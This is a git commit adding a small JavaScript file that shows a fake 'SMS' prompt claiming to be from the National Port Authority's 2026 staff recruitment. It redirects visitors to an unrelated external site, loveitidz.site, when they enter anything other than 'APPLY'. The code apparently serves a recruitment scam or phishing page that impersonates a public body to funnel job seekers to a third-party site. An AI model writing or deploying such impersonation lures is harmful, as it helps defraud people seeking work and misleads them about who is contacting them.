c079d003aad7cdf28ce50eab4061041974663025
usorondo87 <pax_wager_3p@icloud.com>
2026-07-08 10:04:25 +0100

    Create npa.js

---
+++ npa.js
@@ -0,0 +1,8 @@
+var password = 'APPLY'
+password = prompt(
+  'SMS: Welcome to National Port Authority (NPA) Staff Recruitment 2026. Please click OK to Proceed.',
+  'APPLY'
+);
+if (password != 'APPLY') {
+  location.href = 'https://www.loveitidz.site/apply-npa-jobs';
+}
